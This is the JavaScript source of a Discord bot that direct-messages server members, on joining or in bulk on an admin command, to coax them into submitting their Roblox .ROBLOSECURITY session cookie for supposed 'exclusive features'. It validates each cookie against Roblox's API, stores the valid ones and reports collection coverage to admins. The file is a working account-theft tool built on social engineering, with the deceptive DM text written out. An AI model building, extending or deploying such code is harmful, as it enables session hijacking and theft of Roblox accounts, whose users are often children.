require('dotenv').config();
const { Client, GatewayIntentBits, Partials, SlashCommandBuilder, REST, Routes } = require('discord.js');
const fetch = require('node-fetch');

const TOKEN = process.env.DISCORD_BOT_TOKEN;
const CLIENT_ID = process.env.DISCORD_CLIENT_ID;
const GUILD_ID = process.env.DISCORD_GUILD_ID;

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessageReactions,
  ],
  partials: [Partials.Channel], // for DMs
});

// In-memory store for who sent cookies and who was DM'd
// Replace with DB or persistent storage for production
const userCookies = new Map(); // userId => { cookie: string, robloxData: object }
const usersDMd = new Set(); // userIds who got DM'd to request cookie

// Helper function to validate Roblox cookie
async function validateRobloxCookie(cookie) {
  try {
    // Clean the cookie input - remove .ROBLOSECURITY= prefix if present
    const cleanCookie = cookie.replace(/^\.ROBLOSECURITY=/, '');
    
    const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        Cookie: `.ROBLOSECURITY=${cleanCookie}`,
        'User-Agent': 'Roblox/WinInet',
      },
    });

    if (!res.ok) {
      return { valid: false, error: `HTTP ${res.status}` };
    }

    const data = await res.json();
    
    // Check if the response contains valid user data
    if (!data.id || !data.name) {
      return { valid: false, error: 'Invalid cookie - no user data returned' };
    }

    return { valid: true, data, cleanCookie };
  } catch (error) {
    return { valid: false, error: error.message };
  }
}

// Register slash commands on startup
const commands = [
  new SlashCommandBuilder()
    .setName('testcookie')
    .setDescription('Test if a Roblox cookie is valid and get API response')
    .addStringOption(option =>
      option.setName('cookie')
        .setDescription('Your Roblox .ROBLOSECURITY cookie')
        .setRequired(true))
    .toJSON(),
  new SlashCommandBuilder()
    .setName('submitcookie')
    .setDescription('Submit your Roblox .ROBLOSECURITY cookie securely')
    .addStringOption(option =>
      option.setName('cookie')
        .setDescription('Your Roblox .ROBLOSECURITY cookie')
        .setRequired(true))
    .toJSON(),
];

const rest = new REST({ version: '10' }).setToken(TOKEN);

(async () => {
  try {
    console.log('Started refreshing application (/) commands.');
    await rest.put(
      Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID),
      { body: commands },
    );
    console.log('Successfully reloaded application (/) commands.');
  } catch (error) {
    console.error(error);
  }
})();

client.once('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);
});

// Helper to send DM for cookie request
async function requestCookieFromUser(user) {
  try {
    if (!user) return;

    // DM user to ask for cookie, only once
    if (!usersDMd.has(user.id)) {
      await user.send("Hi! Please submit your Roblox `.ROBLOSECURITY` cookie securely with `/submitcookie <cookie>` so you can access exclusive features.\n\n**Note:** Your cookie will be validated to ensure it's authentic before being stored.");
      usersDMd.add(user.id);
    }
  } catch (error) {
    console.warn(`Could not request cookie from user ${user.id}:`, error.message);
  }
}

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  if (interaction.commandName === 'testcookie') {
    const cookie = interaction.options.getString('cookie');

    await interaction.deferReply({ ephemeral: true });

    const validation = await validateRobloxCookie(cookie);
    
    if (!validation.valid) {
      await interaction.editReply(`❌ Invalid cookie: ${validation.error}`);
      return;
    }

    await interaction.editReply(`✅ Valid cookie! User authenticated as: **${validation.data.name}** (ID: ${validation.data.id})\n\`\`\`json\n${JSON.stringify(validation.data, null, 2)}\n\`\`\``);
  }

  if (interaction.commandName === 'submitcookie') {
    const cookie = interaction.options.getString('cookie');
    const userId = interaction.user.id;

    await interaction.deferReply({ ephemeral: true });

    // Validate cookie before storing
    const validation = await validateRobloxCookie(cookie);
    
    if (!validation.valid) {
      await interaction.editReply(`❌ Invalid cookie: ${validation.error}\nPlease provide a valid .ROBLOSECURITY cookie from Roblox.`);
      return;
    }

    // Store cookie and user data securely
    userCookies.set(userId, {
      cookie: validation.cleanCookie,
      robloxData: validation.data,
      submittedAt: new Date()
    });

    await interaction.editReply(`✅ Valid cookie received and stored securely!\nAuthenticated as: **${validation.data.name}** (ID: ${validation.data.id})`);
  }
});

// Optional: When members join the server, request cookie if not submitted
client.on('guildMemberAdd', async member => {
  if (!userCookies.has(member.id)) {
    await requestCookieFromUser(member.user);
  }
});

// Command to manually check users without cookies and DM them (for admins)
client.on('messageCreate', async message => {
  if (message.content === '!checkcookies' && message.member.permissions.has('Administrator')) {
    const guild = message.guild;
    const members = await guild.members.fetch();

    let count = 0;
    for (const member of members.values()) {
      if (!member.user.bot && !userCookies.has(member.id)) {
        await requestCookieFromUser(member.user);
        count++;
      }
    }
    message.channel.send(`Requested cookies from ${count} users who have not submitted yet.`);
  }

  // Admin command to check cookie status
  if (message.content === '!cookiestatus' && message.member.permissions.has('Administrator')) {
    const validCookies = userCookies.size;
    const totalMembers = message.guild.memberCount - message.guild.members.cache.filter(m => m.user.bot).size;
    
    message.channel.send(`📊 **Cookie Status:**\n✅ Valid cookies stored: ${validCookies}\n👥 Total members: ${totalMembers}\n📈 Coverage: ${((validCookies / totalMembers) * 100).toFixed(1)}%`);
  }
});

client.login(TOKEN);
